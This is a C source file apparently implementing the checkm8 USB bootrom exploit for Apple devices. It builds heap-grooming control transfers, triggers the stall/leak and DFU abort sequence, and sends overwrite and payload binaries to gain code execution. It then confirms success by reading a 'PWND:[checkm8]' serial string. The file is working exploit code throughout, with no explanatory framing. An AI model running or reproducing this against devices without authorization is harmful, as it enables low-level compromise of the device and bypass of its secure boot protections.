#include "checkm8.h"
#include <stdlib.h>

#include "usb_helpers.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

static unsigned char data_0xA_0xC0_buf[192] =
        {
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA
        };

static unsigned char data_0xA_0xC1_buf[193] =
        {
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA
        };

static unsigned char data_0x0_0x40_buf[64] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
        };

static unsigned char data_0x0_0x41_buf[65] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0
        };

static unsigned char data_0x0_0xC0_buf[192] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
        };

int stall(struct pwned_device *dev)
{
    checkm8_debug_indent("stall(dev = %p)\n", dev);
    return partial_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC0_buf, 0xC0, 1);
}

int leak(struct pwned_device *dev)
{
    checkm8_debug_indent("leak(dev = %p)\n", dev);
    no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0xC0_buf, 0xC0, 1);
    return CHECKM8_SUCCESS;
}

int no_leak(struct pwned_device *dev)
{
    checkm8_debug_indent("no_leak(dev = %p)\n", dev);
    no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC1_buf, 0xC1, 1);
    return CHECKM8_SUCCESS;
}

int usb_req_stall(struct pwned_device *dev)
{
    checkm8_debug_indent("usb_req_stall(dev = %p)\n", dev);
    unsigned char data[0];
    no_error_ctrl_transfer(dev, 0x2, 3, 0, 0x80, data, 0, 10);
    return CHECKM8_SUCCESS;
}

int usb_req_leak(struct pwned_device *dev)
{
    checkm8_debug_indent("usb_req_leak(dev = %p)\n", dev);
    no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0x40_buf, 0x40, 1);
    return CHECKM8_SUCCESS;
}

int usb_req_no_leak(struct pwned_device *dev)
{
    checkm8_debug_indent("usb_req_no_leak(dev = %p)\n", dev);
    no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0x41_buf, 0x41, 1);
    return CHECKM8_SUCCESS;
}

int stage1_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 1\n");
    unsigned int i;

    stall(dev);
    for(i = 0; i < 5; i++) no_leak(dev);
    usb_req_leak(dev);
    no_leak(dev);

    checkm8_debug_indent("\treset\n");
    reset(dev);
    return CHECKM8_SUCCESS;
}

int stage2_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 2\n");
    unsigned char databuf[0x800];
    memset(databuf, 'A', 0x800);

    partial_ctrl_transfer(dev, 0x21, 1, 0, 0, databuf, 0x800, 1);
    no_error_ctrl_transfer(dev, 0x21, 4, 0, 0, NULL, 0, 0);

    checkm8_debug_indent("\treset\n");
    reset(dev);
    return CHECKM8_SUCCESS;
}

int stage3_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 3\n");
    unsigned char overwrite_buf[1524];
    FILE *overwrite_file = fopen(CHECKM8_BIN_BASE "overwrite.bin", "r");
    fread(overwrite_buf, 1524, 1, overwrite_file);
    fclose(overwrite_file);

    unsigned char payload_buf[2400];
    FILE *payload_file = fopen(CHECKM8_BIN_BASE "payload.bin", "r");
    fread(payload_buf, 2400, 1, payload_file);
    fclose(payload_file);

    usb_req_stall(dev);
    usb_req_leak(dev);

    checkm8_debug_indent("\ttransferring overwrite\n");
    no_error_ctrl_transfer(dev, 0, 0, 0, 0, overwrite_buf, 1524, 100);

    checkm8_debug_indent("\ttransferring payload\n");
    no_error_ctrl_transfer(dev, 0x21, 1, 0, 0, payload_buf, 2048, 100);
    no_error_ctrl_transfer(dev, 0x21, 1, 0, 0, &payload_buf[2048], 352, 100);

    checkm8_debug_indent("reset\n");
    reset(dev);
    return CHECKM8_SUCCESS;
}

int check_function(struct pwned_device *dev)
{
    checkm8_debug_indent("checking device serial\n");
    unsigned char serial_buf[128];
    unsigned int i;

    serial_descriptor(dev, serial_buf, sizeof(serial_buf));
    checkm8_debug_indent("\tgot serial %s\n", serial_buf);
    for(i = 0; i < 13; i++)
    {
        if(serial_buf[99 + i] != "PWND:[checkm8]"[i])
        {
            return CHECKM8_FAIL_NOEXP;
        }
    }

    return CHECKM8_SUCCESS;
}

struct pwned_device *exploit_device()
{
    int ret;
    struct pwned_device *res = calloc(1, sizeof(struct pwned_device));
    checkm8_debug_indent("exploit_device() -> dev = %p\n", res);
    res->status = DEV_NORMAL;
    res->idVendor = DEV_IDVENDOR;
    res->idProduct = DEV_IDPRODUCT;

#ifdef WITH_ARDUINO
    res->ard_fd = -1;
#else
    res->bundle = calloc(1, sizeof(struct libusb_device_bundle));
#endif

    ret = open_device_session(res);
    if(IS_CHECKM8_FAIL(ret))
    {
        checkm8_debug_indent("\tfailed to open device session\n");
        free_device(res);
        return NULL;
    }

    ret = check_function(res);
    if(ret == CHECKM8_SUCCESS)
    {
        // already exploited
        res->status = DEV_PWNED;
        close_device_session(res);
        return res;
    }
    else if(ret == CHECKM8_FAIL_NODEV)
    {
        // no device found
        free_device(res);
        return NULL;
    }
    else
    {
        // normal device found - exploit
        ret = stage1_function(res);
        if(ret == CHECKM8_SUCCESS)
        {
            ret = stage2_function(res);
            usleep(500000);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            ret = stage3_function(res);
            usleep(500000);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            ret = check_function(res);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            res->status = DEV_PWNED;
            close_device_session(res);
            return res;
        }
        else
        {
            free_device(res);
            return NULL;
        }
    }
}

void free_device(struct pwned_device *dev)
{
    close_device_session(dev);
#ifndef WITH_ARDUINO
    free(dev->bundle);
#endif
    free(dev);
}